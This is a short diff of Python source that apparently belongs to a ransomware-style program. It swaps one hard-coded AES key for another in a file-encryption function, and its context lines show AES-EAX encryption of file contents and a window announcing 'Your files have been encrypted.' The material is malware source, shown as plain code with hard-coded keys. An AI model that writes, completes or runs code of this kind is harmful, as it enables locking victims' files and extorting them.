@@ -30,7 +30,7 @@ def DecryptFile(file,password):
 
 def fast_encrypt(infile, pw):
     with open(infile, 'rb') as file_data:
-        key = bytes('warm2daywarm2day', 'utf-8')
+        key = bytes('floofloofloofloo', 'utf-8')
         # print(str(key))
         cipher = AES.new(key, AES.MODE_EAX)
         ciphertext, tag = cipher.encrypt_and_digest(file_data.read())
@@ -128,7 +128,7 @@ WSBCTE9DSy0tLS0tCg=="""
 
 
 if __name__ == '__main__':
-    # fast_encrypt("./test/test.txt", "Warm2Day")
+    # fast_encrypt("./test/test.txt", "floo")
     # fast_decrypt()
     # Define the window's contents
     layout = [[sg.Text("Your files have been encrypted. ")],
